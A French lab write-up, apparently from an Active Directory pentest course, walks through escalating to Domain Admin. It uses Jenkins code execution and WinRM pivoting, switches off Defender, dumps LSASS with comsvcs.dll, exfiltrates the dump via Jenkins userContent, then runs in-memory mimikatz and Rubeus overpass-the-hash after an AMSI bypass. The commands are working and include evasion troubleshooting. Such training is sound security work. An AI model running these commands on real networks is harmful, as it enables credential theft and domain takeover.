---
lo: 7
statut: validé
---
# LO7 - Session DA et escalade

> [!info] Objectif
> Identifier une session de Domain Admin, compromettre la machine et escalader vers **Domain Admin** via dcorp-ci → derivative admin.

> [!abstract] Pourquoi · Chaînage
> **Couche identité + hôte.** Jenkins (dcorp-ci) donne du RCE en `ciadmin`, qui est **admin local dérivé sur dcorp-mgmt** où vit la **session DA `svcadmin`**. On dump LSASS de dcorp-mgmt → clé AES256 de svcadmin → **OverPass-the-Hash** → DA.
> **Prérequis → débloque** : accès Jenkins ([[LO05 - Privesc locale et Jenkins]]) → clé svcadmin → TGT DA → DCSync/krbtgt.

> [!warning] Contexte de CE pod (verrouillé)
> La student VM est **non-admin** et son **Windows Firewall bloque tout inbound** → **impossible d'héberger HFS ou de recevoir un reverse shell**. Le chemin "standard" du manual (reverse shell → student VM, hosting port 80) **échoue**. La chaîne ci-dessous est l'**adaptation qui marche sans aucun inbound student VM**.
> Test décisif : `Test-NetConnection <studentIP> -Port 80` **depuis dcorp-ci** = `False` alors que le loopback + HFS servent en local → c'est le FW student VM (non-admin = non réparable). On pivote.

## Chaîne d'exploitation (validée)

### 1. Identifier la session DA
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Invoke-SessionHunter.ps1
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```
→ **`svcadmin` (DA) a une session sur `dcorp-mgmt`**. (Non-admin OK : passe par Remote Registry.)
`dcorp-adminsrv` = sous-objectif **séparé** (AppLocker/GPO), pas cette voie.

### 2. RCE `ciadmin` via Jenkins
Le build step `Execute Windows batch command` tourne en `dcorp\ciadmin` (admin **High** sur dcorp-ci). **RCE = Console Output = ton shell** — pas besoin de reverse shell.

> [!tip] Le build est du `cmd`, pas du PowerShell
> `'Invoke-Command' is not recognized` = tu es en batch. Préfixe : `powershell -c "..."` ou `powershell -enc <b64>` (le `-enc` évite l'enfer des guillemets).

### 3. Pivot OUTBOUND vers dcorp-mgmt
ciadmin est **admin sur dcorp-mgmt** (mais **pas** sur adminsrv → `Access denied` là-bas). WinRM sortant = aucune règle à ouvrir.
```cmd
powershell -c "Invoke-Command -ComputerName dcorp-mgmt -ScriptBlock { hostname; whoami }"
```
→ `dcorp\ciadmin` = exécution outbound OK, zéro reverse shell.

### 4. Couper Defender (défait l'AMSI de dcorp-ci)
> [!note] Pourquoi couper Defender et pas juste bypasser
> En **one-shot** depuis le build, l'AMSI scanne **tout le buffer `-enc` avant exécution** → impossible de "bypass-first" (contrairement à un shell interactif où chaque ligne est scannée seule). Mais ciadmin est **admin sur dcorp-ci ET dcorp-mgmt** → `Set-MpPreference` = cmdlet **légitime, non bloqué par AMSI**.

```cmd
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true; Invoke-Command -ComputerName dcorp-mgmt {Set-MpPreference -DisableRealtimeMonitoring $true}; (Get-MpComputerStatus).RealTimeProtectionEnabled"
```
→ `False` des deux côtés (pas de **Tamper Protection** dans ce lab). L'AMSI tombe.

### 5. Dump LSASS de dcorp-mgmt — built-in, aucun outil à héberger
`comsvcs.dll MiniDump` (natif Windows) via la session, `.dmp` déposé dans le **workspace Jenkins**.

> [!example]- Payload de dump (encodé en `powershell -enc` dans le build)
> Version lisible (Defender déjà coupé à l'étape 4) :
> ```powershell
> $s=New-PSSession -ComputerName dcorp-mgmt
> Invoke-Command -Session $s -ScriptBlock { $p=(Get-Process lsass).Id; cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Users\Public\lsass.dmp full" }
> Copy-Item -FromSession $s C:\Users\Public\lsass.dmp -Destination "$env:WORKSPACE\lsass.dmp"
> Remove-PSSession $s
> ```
> `$env:WORKSPACE` = chemin du workspace fourni par Jenkins. Note la **taille** du dump (ex 48694073) pour vérifier l'intégrité après download.

### 6. Exfil via Jenkins `userContent` — aucun inbound student VM
Jenkins sert **toujours** `$JENKINS_HOME\userContent\` à `/userContent/` (le `/ws/` peut être désactivé → 404).
```cmd
powershell -c "$d='C:\Users\Administrator\.jenkins\userContent'; ni -ItemType Directory -Force $d | Out-Null; Copy-Item $env:WORKSPACE\lsass.dmp $d\lsass.dmp -Force"
```
Student VM (**outbound** vers Jenkins, ça route) :
```powershell
iwr http://dcorp-ci:8080/userContent/lsass.dmp -OutFile C:\AD\Tools\lsass.dmp -UseBasicParsing
(Get-Item C:\AD\Tools\lsass.dmp).Length   # doit = taille du dump source
```

> [!danger] Télécharge en `iwr`, JAMAIS au navigateur
> Le navigateur corrompt le binaire → mimikatz plante `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory`. Indice = l'erreur **change** entre 2 downloads. Vérifie la taille exacte.

### 7. Parse en local — mimikatz.exe bloqué → in-memory
`mimikatz.exe` → `Access is denied` = **Defender de la student VM** (non coupable, tu es non-admin en local). Passe par `Invoke-Mimi` **en mémoire** après bypass AMSI (marche car le bypass patche la session PowerShell courante) :
```powershell
iex (Get-Content C:\AD\Tools\amsibypass.txt -Raw)
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass.dmp" "sekurlsa::ekeys"'
```
→ bloc **`svcadmin`** → note sa clé **`aes256_hmac`**.

> [!tip] Quel compte prendre dans `ekeys`
> Trie sur le **privilège** : garde le compte **de domaine** qui est **Domain Admin** = `svcadmin`. Jette le compte machine `DCORP-MGMT$` et `mgmtadmin` (admin **local** seulement). Confirme : `Get-DomainGroupMember "Domain Admins"`.

### 8. OverPass-the-Hash → Domain Admin
> [!warning] `Loader.exe` échoue silencieusement ici
> Loader lance Rubeus dans un **process séparé** où le Defender local est actif → Rubeus bloqué, **zéro sortie**. Le bypass AMSI ne patche QUE la session PowerShell courante. Solution : charge Rubeus **en mémoire dans cette session** (comme Invoke-Mimi).

```powershell
iex (Get-Content C:\AD\Tools\amsibypass.txt -Raw)
$a=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\AD\Tools\Rubeus.exe"))
$a.EntryPoint.Invoke($null,@(,[string[]]@("asktgt","/user:svcadmin","/aes256:<clé_aes256_svcadmin>","/opsec","/ptt")))
klist
```
→ `klist` montre un **TGT `krbtgt/DOLLARCORP` pour svcadmin** (un **ticket**, pas un mot de passe — c'est ça la preuve). `/ptt` injecte dans la session courante.

Preuve DA :
```cmd
dir \\dcorp-dc.dollarcorp.moneycorp.local\C$
```
Accès OK = **Domain Admin atteint → LO7 validé.**

## Pièges rencontrés

> [!failure]- Journal des murs (et le fix qui a marché)
> - `Test-NetConnection ... False` sur 80 **et** 8000 depuis dcorp-ci, alors que HFS sert en loopback → **FW inbound student VM** (non-admin). → abandon hosting, pivot Jenkins.
> - `Invoke-Command dcorp-adminsrv` → `Access denied` = **mauvaise box** (ciadmin y est pas admin). La session DA est sur **dcorp-mgmt**.
> - `-enc` avec bypass AMSI en clair → `ScriptContainedMaliciousContent` (AMSI dcorp-ci scanne tout le buffer). → couper Defender (admin) au lieu de bypasser.
> - `iwr` du tool depuis student VM dans le build → `Unable to connect` = FW student VM (même cause). → exfil OUT via userContent, pas download IN.
> - `mimikatz.exe` / `Rubeus.exe` en natif → `Access denied` / zéro sortie = **Defender local student VM**. → tout en mémoire dans la session PowerShell AMSI-bypassée.
> - dump téléchargé au navigateur → `acquireLSA ; Handle on memory` = binaire corrompu. → `iwr` + vérif taille.

## Fiches liées

- [[Cheatsheet - Lateral movement]]
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Tickets Kerberos]]
- [[Cheatsheet - Chemins des outils]]
- [[LO05 - Privesc locale et Jenkins]]

## Voir aussi
[[Journal - Index]] · [[2. Attack flow]]
